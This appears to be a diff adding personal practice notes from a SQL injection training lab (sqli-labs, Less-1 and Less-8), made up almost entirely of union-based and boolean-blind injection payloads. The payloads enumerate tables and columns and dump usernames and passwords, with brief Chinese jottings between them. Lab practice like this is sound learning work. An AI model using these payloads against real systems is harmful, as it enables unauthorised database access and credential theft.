@@ -1,0 +1,24 @@
+http://58.240.236.231:27001/Less-1/?id=1%27%20union%20select%20database()%20%23
+
+-1' union select 1,2,database()#
+-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='security'#
+-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users'#
+-1' union select 1,group_concat(username),group_concat(password) from users#
+
+
+检测字母？
+and substr((select database()), 1, 1) = 's'#
+and substr((select group_concat(table_name) from information_schema.tables where table_schema='security'), 1, 1) = 's'#
+
+1' and substr('abc',1,1)>='b'%23
+1' and substr((select database()), 1, 1) = 's'%23
+1' and database()='security'%23
+
+大小写判断?
+ascii(substr(database(),1,1))>120
+
+requests.get(url+foo, timeout=4)
+
+http://58.240.236.231:27001/Less-8/?id=1' and substr('abc',1,1)>='b'%23
+
+1' and substr((select database()), 1, 1) = 's'#
